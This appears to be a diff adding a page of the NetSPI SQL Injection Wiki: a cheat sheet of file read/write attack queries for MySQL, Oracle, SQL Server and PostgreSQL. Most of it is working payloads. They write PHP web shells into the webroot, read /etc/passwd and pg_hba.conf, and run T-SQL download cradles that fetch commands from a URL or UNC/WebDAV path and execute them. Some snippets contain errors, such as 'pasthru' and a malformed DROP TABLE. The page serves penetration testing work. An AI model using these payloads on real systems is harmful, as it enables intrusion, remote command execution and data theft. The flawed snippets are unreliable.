@@ -1,0 +1,551 @@
+<html>
+
+<head>
+  <meta charset="utf-8">
+  <title>Reading and Writing Files | NetSPI SQL Injection Wiki</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="stylesheet" href="../../assets/scss/index.css%3F1571409135814090317.css" />
+  <link rel="stylesheet" href="../../assets/scss/nav.css%3F1571409135814090317.css" />
+  <link rel="stylesheet" href="../../assets/scss/tab.css%3F1571409135814090317.css" />
+  <!-- We're going to load JS up top, this makes sure all of our painting is done hopefully in one sweep  -->
+  <script src="../../assets/javascripts/cash.min.js"></script>
+  <script type="text/javascript" async src="../../assets/javascripts/index.js%3F1571409135814090317"></script>
+  
+  <script type="text/javascript" async src="../../assets/javascripts/tab.js%3F1571409135814090317"></script>
+  
+  <meta name="theme-color" content="#ffffff">
+  <meta property="og:type" content="website" />
+  <meta property="og:title" content="NetSPI SQL Injection Wiki" />
+  <meta property="og:description" content="Reading and writing to files aids in data gathering as well as data exfiltration." />
+  <meta property="og:image" content="/assets/images/facebookCard.jpg" />
+  <meta name="twitter:title" content="NetSPI SQL Injection Wiki" />
+  <meta name="twitter:description" content="Reading and writing to files aids in data gathering as well as data exfiltration." />
+  <meta name="twitter:card" content="summary_large_image" />
+  <meta name="twitter:image" content="/assets/images/twitterCard.jpg">
+  <meta name="twitter:site" content="@netspi" />
+  <meta name="twitter:creator" content="@netspi" />
+  <meta name="description" content="Reading and writing to files aids in data gathering as well as data exfiltration.">
+  <meta name="keywords" content="netspi, sql injection, wiki, sqli, sql, injection, netspy, network security professionals, oracle, mysql, sqlserver, mssql, cheat sheet, cheat, sheet,data gathering, reading and writing, reading, writing">
+  <link rel="author" href="https://netspi.com" />
+  <link rel="shortcut icon" href="../../assets/images/favicon.ico">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+</head>
+
+<body class="preload">
+  <div class="mobile"></div>
+  <div id="contentWrapper">
+    <div id="topBar">
+      <div class="n-nav-icon default">
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+      </div>
+      <div id="logoContainer">
+      <a href="https://netspi.com"><img src="../../assets/images/logo.png%3F1571409135814090317" /></a><br/>
+      </div>
+    </div>
+    <div class="n-navbar default">
+      <ul>
+  
+  
+  <li class="n-nav-item n-top-nav-item">
+    
+    <a class="link" data-route="/" href="../../index.html">
+      
+    <div>Home</div>
+    </a>
+  </li>
+   
+  
+  <li class="n-nav-item n-top-nav-item">
+    
+    <a class="link" target="_blank" rel="noopener" href="https://netspi.com">
+    
+    <div>About Us</div>
+    </a>
+  </li>
+   
+  
+  <li class="n-nav-item n-top-nav-item">
+    
+    <a class="link" data-route="/detection" href="../../detection.html">
+      
+    <div>Injection Detection</div>
+    </a>
+  </li>
+   
+  
+  <li class="n-nav-item n-top-nav-item">
+    
+    <a class="link" data-route="/dbmsIdentification/" href="../../dbmsIdentification/index.html">
+      
+    <div>DBMS Identification</div>
+    </a>
+  </li>
+   
+  
+  <li>
+    <ul>
+      
+      <li class="n-nav-item n-top-nav-item">
+        
+        <a class="link" data-route="/injectionTypes/" href="../../injectionTypes/index.html">
+          
+          <div>Injection Types</div>
+        </a>
+      </li>
+      
+      
+      <li class="n-nav-item">
+        
+        <a class="link" data-route="/injectionTypes/errorBased/" href="../../injectionTypes/errorBased/index.html">
+          
+          <div>Error Based Injection</div>
+        </a>
+      </li>
+      
+      <li class="n-nav-item">
+        
+        <a class="link" data-route="/injectionTypes/unionBased/" href="../../injectionTypes/unionBased/index.html">
+          
+          <div>Union Based Injection</div>
+        </a>
+      </li>
+      
+      <li class="n-nav-item">
+        
+        <a class="link" data-route="/injectionTypes/blindBased/" href="../../injectionTypes/blindBased/index.html">
+          
+          <div>Blind Based Injection</div>
+        </a>
+      </li>
+      
+    </ul>
+  </li>
+   
+  
+  <li>
+    <ul>
+      
+      <li class="n-nav-item n-top-nav-item">
+        
+        <a class="link" data-route="/injectionTechniques/" href="../../injectionTechniques/index.html">
+          
+          <div>Injection Techniques</div>
+        </a>
+      </li>
+      
+      
+      <li class="n-nav-item">
+        
+        <a class="link" data-route="/injectionTechniques/conditionalStatements/" href="../../injectionTechniques/conditionalStatements/index.html">
+          
+          <div>Conditional Statements</div>
+        </a>
+      </li>
+      
+      <li class="n-nav-item">
+        
+        <a class="link" data-route="/injectionTechniques/injectionPlacement/" href="../../injectionTechniques/injectionPlacement/index.html">
+          
+          <div>Injection Placement</div>
+        </a>
+      </li>
+      
+      <li class="n-nav-item">
+        
+        <a class="link" data-route="/injectionTechniques/obfuscation/" href="../../injectionTechniques/obfuscation/index.html">
+          
+          <div>Injection Obfuscation</div>
+        </a>
+      </li>
+      
+    </ul>
+  </li>
+   
+  
+  <li>
+    <ul>
+      
+      <li class="n-nav-item n-top-nav-item">
+        
+        <a class="link" data-route="/attackQueries/" href="../index.html">
+          
+          <div>Attack Queries</div>
+        </a>
+      </li>
+      
+      
+      <li class="n-nav-item">
+        
+        <a class="link" data-route="/attackQueries/informationGathering/" href="../informationGathering/index.html">
+          
+          <div>Information Gathering</div>
+        </a>
+      </li>
+      
+      <li class="n-nav-item">
+        
+        <a class="link" data-route="/attackQueries/dataTargeting/" href="../dataTargeting/index.html">
+          
+          <div>Data Targeting</div>
+        </a>
+      </li>
+      
+      <li class="n-nav-item">
+        
+        <a class="link" data-route="/attackQueries/privilegeEscalation/" href="../privilegeEscalation/index.html">
+          
+          <div>Privilege Escalation</div>
+        </a>
+      </li>
+      
+      <li class="n-nav-item">
+        
+        <a class="link" data-route="/attackQueries/executingOSCommands/" href="../executingOSCommands/index.html">
+          
+          <div>Executing OS Commands</div>
+        </a>
+      </li>
+      
+      <li class="n-nav-item">
+        
+        <a class="link" data-route="/attackQueries/readingAndWritingFiles/" href="index.html">
+          
+          <div>Reading and Writing Files</div>
+        </a>
+      </li>
+      
+      <li class="n-nav-item">
+        
+        <a class="link" data-route="/attackQueries/lateralMovement/" href="../lateralMovement/index.html">
+          
+          <div>Lateral Movement</div>
+        </a>
+      </li>
+      
+      <li class="n-nav-item">
+        
+        <a class="link" data-route="/attackQueries/dataExfiltration/" href="../dataExfiltration.html">
+          
+          <div>Data Exfiltration</div>
+        </a>
+      </li>
+      
+      <li class="n-nav-item">
+        
+        <a class="link" data-route="/attackQueries/persistence/" href="../persistence/index.html">
+          
+          <div>Persistence</div>
+        </a>
+      </li>
+      
+    </ul>
+  </li>
+   
+  
+  <li>
+    <ul>
+      
+      <li class="n-nav-item n-top-nav-item">
+          <div>Misc.</div>
+      </li>
+      
+      
+      <li class="n-nav-item">
+        
+        <a class="link" data-route="/misc/contributors" href="../../misc/contributors.html">
+          
+          <div>Contributors</div>
+        </a>
+      </li>
+      
+      <li class="n-nav-item">
+        
+        <a class="link" data-route="/misc/references/" href="../../misc/references/index.html">
+          
+          <div>References</div>
+        </a>
+      </li>
+      
+      <li class="n-nav-item">
+        
+        <a class="link" data-route="/misc/sandboxes/" href="../../misc/sandboxes/index.html">
+          
+          <div>Sandboxes</div>
+        </a>
+      </li>
+      
+      <li class="n-nav-item">
+        
+        <a class="link" data-route="/misc/tools/" href="../../misc/tools/index.html">
+          
+          <div>Tools</div>
+        </a>
+      </li>
+      
+    </ul>
+  </li>
+   
+</ul>
+
+    </div>
+    <div id="contentContainer">
+      <div id="tabs" class="tabs" data-tabs-ignore-url="false">
+
+<input class="tabInput"  name="tabs" type="radio" id="mysql"/>
+<label class="tabLabel" onClick="updateTab('mysql',false)" for="mysql">MySQL</label>
+<div id="tabPanel" class="tabPanel">
+     <h3 id="reading-and-writing-files">Reading and Writing Files</h3>
+
+
+<p class="pageDescription">Reading and writing to files aids in data gathering as well as data exfiltration. Many methods include writing to the webroot, which enables a web shell to be executed, or allowing data to be exfiltrated over port 80/443.</p>
+
+<p>* Requires privileged user</p>
+<table class="table table-striped table-hover">
+    <thead>
+        <tr>
+            <th>Description</th>
+            <th align="left">Query</th>
+        </tr>
+    </thead>
+    <tbody>
+        <tr>
+            <td>Dump to file</td>
+            <td>SELECT * FROM mytable INTO dumpfile '/tmp/somefile'</td>
+        </tr>
+        <tr>
+            <td>Dump PHP Shell</td>
+            <td>SELECT 'system($_GET[\'c\']); ?>' INTO OUTFILE '/var/www/shell.php'</td>
+        </tr>
+        <tr>
+            <td>Read File</td>
+            <td>SELECT LOAD_FILE('/etc/passwd')</td>
+        </tr>
+        <tr>
+            <td>Read File Obfuscated</td>
+            <td>SELECT LOAD_FILE(0x633A5C626F6F742E696E69)<br> <em>reads c:\boot.ini</em></td>
+        </tr>
+        <tr>
+            <td>File Privileges</td>
+            <td>SELECT file_priv FROM mysql.user WHERE user = 'netspi'<br>SELECT grantee, is_grantable FROM information_schema.user_privileges WHERE privilege_type = 'file' AND grantee like '%netspi%'</td>
+        </tr>
+    </tbody>
+</table>
+
+</div>
+
+<input class="tabInput"  name="tabs" type="radio" id="oracle"/>
+<label class="tabLabel" onClick="updateTab('oracle',false)" for="oracle">Oracle</label>
+<div id="tabPanel" class="tabPanel">
+     <h3 id="reading-and-writing-files">Reading and Writing Files</h3>
+
+<p class="pageDescription">Reading and writing to files aids in data gathering as well as data exfiltration. Many methods include writing to the webroot, which enables a web shell to be executed, or allowing data to be exfiltrated over port 80/443.</p>
+
+<p><a target="_blank" rel="noopener" href="http://www.0xdeadbeef.info/exploits/raptor_oraexec.sql">UTL_FILE</a> can sometimes be used. Check that the following is non-null: <br> <code>SELECT value FROM v$parameter2 WHERE name = 'utl_file_dir';</code></p>
+
+<p><a target="_blank" rel="noopener" href="http://www.0xdeadbeef.info/exploits/raptor_oraexec.sql">Java</a> can be used to read and write files if it's installed (it is not available in Oracle Express).</p>
+
+</div>
+
+<input class="tabInput"  name="tabs" type="radio" id="sqlserver"/>
+<label class="tabLabel" onClick="updateTab('sqlserver',false)" for="sqlserver">SQL Server</label>
+<div id="tabPanel" class="tabPanel">
+     <h3 id="reading-and-writing-files">Reading and Writing Files</h3>
+
+
+<p class="pageDescription">Reading and writing to files aids in data gathering as well as data exfiltration. Many methods include writing to the webroot, which enables a web shell to be executed, or allowing data to be exfiltrated over port 80/443.</p>
+
+<p>* Requires privileged user</p>
+<table class="table table-striped table-hover">
+  <thead>
+    <tr>
+      <th>Description</th>
+      <th>Query</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>Download Cradle bulk in server - TSQL</td>
+      <td>-- Bulk Insert - Download Cradle Example<br/>
+      <br/>
+      -- Setup variables<br/>
+      Declare @cmd varchar(8000)<br/>
+      <br/>
+      -- Create temp table<br/>
+      CREATE TABLE #file (content nvarchar(4000));<br/>
+      <br/>
+      -- Read file into temp table - web server must support propfind<br/>
+      BULK INSERT #file FROM '\\sharepoint.acme.com@SSL\Path\to\file.txt';<br/>
+      <br/>
+      -- Select contents of file<br/>
+      SELECT @cmd = content FROM #file<br/>
+      <br/>
+      -- Display command<br/>
+      SELECT @cmd<br/>
+      <br/>
+      -- Run command<br/>
+      EXECUTE(@cmd)<br/>
+      <br/>
+      -- Drop the temp table<br/>
+      DROP TABLE #file</td>
+    </tr>
+    <tr>
+      <td>Download Cradle OAP 1 - TSQL</td>
+      <td>-- OLE Automation Procedure - Download Cradle Example<br/>
+      -- Does not require a table, but can't handle larger payloads<br/>
+      <br/>
+      -- Note: This also works with unc paths \\ip\file.txt<br/>
+      -- Note: This also works with webdav paths \\ip@80\file.txt However, the target web server needs to support propfind.<br/>
+      <br/>
+      -- Setup Variables<br/>
+      DECLARE @url varchar(300)<br/>
+      DECLARE @WinHTTP int<br/>
+      DECLARE @handle  int<br/>
+      DECLARE @Command varchar(8000)<br/>
+      <br/>
+      -- Set target url containting TSQL<br/>
+      SET @url = 'http://127.0.0.1/mycmd.txt'<br/>
+      <br/>
+      -- Setup namespace<br/>
+      EXEC @handle=sp_OACreate 'WinHttp.WinHttpRequest.5.1',@WinHTTP OUT<br/>
+      <br/>
+      -- Call the Open method to setup the HTTP request<br/>
+      EXEC @handle=sp_OAMethod @WinHTTP, 'Open',NULL,'GET',@url,'false'<br/>
+      <br/>
+      -- Call the Send method to send the HTTP GET request<br/>
+      EXEC @handle=sp_OAMethod @WinHTTP,'Send'<br/>
+      <br/>
+      -- Capture the HTTP response content<br/>
+      EXEC @handle=sp_OAGetProperty @WinHTTP,'ResponseText', @Command out<br/>
+      <br/>
+      -- Destroy the object<br/>
+      EXEC @handle=sp_OADestroy @WinHTTP<br/>
+      <br/>
+      -- Display command<br/>
+      SELECT @Command<br/>
+      <br/>
+      -- Run command<br/>
+      EXECUTE (@Command)</td>
+    </tr>
+    <tr>
+      <td>Download Cradle OAP 2 - TSQL</td>
+      <td>-- OLE Automation Procedure - Download Cradle Example - Option 2<br/>
+      -- Can handle larger payloads, but requires a table<br/>
+      <br/>
+      -- Note: This also works with unc paths \\ip\file.txt<br/>
+      -- Note: This also works with webdav paths \\ip@80\file.txt However, the target web server needs to support propfind.<br/>
+      <br/>
+      -- Setup Variables<br/>
+      DECLARE @url varchar(300)<br/>
+      DECLARE @WinHTTP int<br/>
+      DECLARE @Handle  int<br/>
+      DECLARE @Command varchar(8000)<br/>
+      <br/>
+      -- Set target url containting TSQL<br/>
+      SET @url = 'http://127.0.0.1/mycmd.txt'<br/>
+      <br/>
+      -- Create temp table to store downloaded string<br/>
+      CREATE TABLE #text(html text NULL)<br/>
+      <br/>
+      -- Setup namespace<br/>
+      EXEC @Handle=sp_OACreate 'WinHttp.WinHttpRequest.5.1',@WinHTTP OUT<br/>
+      <br/>
+      -- Call open method to configure HTTP request<br/>
+      EXEC @Handle=sp_OAMethod @WinHTTP, 'Open',NULL,'GET',@url,'false'<br/>
+      <br/>
+      -- Call Send method to send the HTTP request<br/>
+      EXEC @Handle=sp_OAMethod @WinHTTP,'Send'<br/>
+      <br/>
+      -- Capture the HTTP response content<br/>
+      INSERT #text(html)<br/>
+      EXEC @Handle=sp_OAGetProperty @WinHTTP,'ResponseText'<br/>
+      <br/>
+      -- Destroy the object<br/>
+      EXEC @Handle=sp_OADestroy @WinHTTP<br/>
+      <br/>
+      -- Display the commad<br/>
+      SELECT @Command = html from #text<br/>
+      SELECT @Command<br/>
+      <br/>
+      -- Run the command<br/>
+      EXECUTE (@Command)<br/>
+      <br/>
+      -- Remove temp table<br/>
+      DROP TABLE #text</td>
+    </tr>
+    <tr>
+      <td>Reading Files - TSQL</td>
+      <td><a target="_blank" rel="noopener" href="https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/readfile_OpenDataSourceTxt.sql">https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/readfile_OpenDataSourceTxt.sql</a><br/>
+      <a target="_blank" rel="noopener" href="https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/readfile_BulkInsert.sql">https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/readfile_BulkInsert.sql</a><br/>
+      <a target="_blank" rel="noopener" href="https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/readfile_OpenDataSourceXlsx">https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/readfile_OpenDataSourceXlsx</a><br/>
+      <a target="_blank" rel="noopener" href="https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/readfile_OpenRowSetBulk.sql">https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/readfile_OpenRowSetBulk.sql</a><br/>
+      <a target="_blank" rel="noopener" href="https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/readfile_OpenRowSetTxt.sql">https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/readfile_OpenRowSetTxt.sql</a><br/>
+      <a target="_blank" rel="noopener" href="https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/readfile_OpenRowSetXlsx.sql">https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/readfile_OpenRowSetXlsx.sql</a></td>
+    </tr>
+    <tr>
+      <td>Writing Files  - TSQL</td>
+      <td><a target="_blank" rel="noopener" href="https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/writefile_bulkinsert.sql">https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/writefile_bulkinsert.sql</a><br/>
+      <a target="_blank" rel="noopener" href="https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/writefile_OpenRowSetTxt.sql">https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/writefile_OpenRowSetTxt.sql</a></td>
+  </tbody>
+</table>
+
+</div>
+
+<input class="tabInput"  name="tabs" type="radio" id="postgresql"/>
+<label class="tabLabel" onClick="updateTab('postgresql',false)" for="postgresql">PostgreSQL</label>
+<div id="tabPanel" class="tabPanel">
+     <h3 id="reading-and-writing-files">Reading and Writing Files</h3>
+
+
+<p class="pageDescription">Reading and writing to files aids in data gathering as well as data exfiltration. Many methods include writing to the webroot, which enables a web shell to be executed, or allowing data to be exfiltrated over port 80/443.</p>
+
+<p>* Requires privileged user</p>
+<table class="table table-striped table-hover">
+  <thead>
+    <tr>
+      <th>Description</th>
+      <th>Query</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>Read Files from Operating System - COPY</td>
+      <td>
+		CREATE TABLE mydata(t text);<br>
+		COPY mydata FROM '/etc/passwd';<br>
+		SELECT * FROM mydata;<br>
+		DROP TABLE mytest mytest;<br>
+	  </td>
+    </tr> 
+    <tr>
+      <td>Read Files from Operating System - pg_read_file</td>
+      <td>
+		SELECT pg_read_file('/usr/local/pgsql/data/pg_hba.conf', 0, 200);
+	  </td>
+    </tr> 		
+    <tr>
+      <td>Writing Files from Operating System</td>
+      <td>
+		CREATE TABLE mytable (mycol text);<br>
+		INSERT INTO mytable(mycol) VALUES ('<? pasthru($_GET[cmd]); ?>');<br>
+		COPY mytable (mycol) TO '/var/www/test.php';<br>
+	  </td>	
+    </tr>	
+  </tbody>
+</table>
+
+</div>
+
+</div>
+
+      <div><div>
+  <br/>
+  <p>© 2019 Copyright by NetSPI. All rights reserved.</p>
+</div>
+</div>
+    </div>
+  </div>
+</body>
+</html>
